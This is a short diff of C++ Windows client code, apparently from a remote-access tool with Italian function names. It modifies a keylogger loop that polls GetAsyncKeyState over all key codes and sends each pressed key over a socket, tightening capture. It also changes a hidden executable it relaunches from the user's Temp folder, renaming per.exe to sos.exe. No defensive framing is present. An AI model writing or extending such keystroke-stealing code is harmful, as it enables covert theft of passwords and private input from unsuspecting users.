@@ -238,7 +238,7 @@ void ricevi(SOCKET s)
 			if(msg[0]=='H' && msg[1]=='H')
 			{
 				cout<<"<Server> Client reset."<<endl;
-				system("start per.exe");//3RIF
+				system("start sos.exe");//3RIF
 				closesocket(s);
 				v=-1;
 				return;
@@ -335,10 +335,9 @@ void ricevi(SOCKET s)
 				{
 					for(char i=1;i<=127;i++)
 					{
-						if(GetAsyncKeyState(i)!=0)
+						if(GetAsyncKeyState(i)==-32767)
 						{
 							send(s,&i,sizeof(i),0);
-							Sleep(55);
 							if(v6==false)
 								break;
 						}
@@ -672,7 +671,7 @@ bool preliminari()
 	DWORD cchComputerName = 256;
 	char n[256]={'\0'};
 	char p1[256]="\"C:\\Users\\";
-	char p2[256]="\\AppData\\Local\\Temp\\per.exe\"";//2RIF
+	char p2[256]="\\AppData\\Local\\Temp\\sos.exe\"";//2RIF
 	char pF[256]={'\0'};
 	char pFN[256]={'\0'};
 	char cmd[256]="start ";
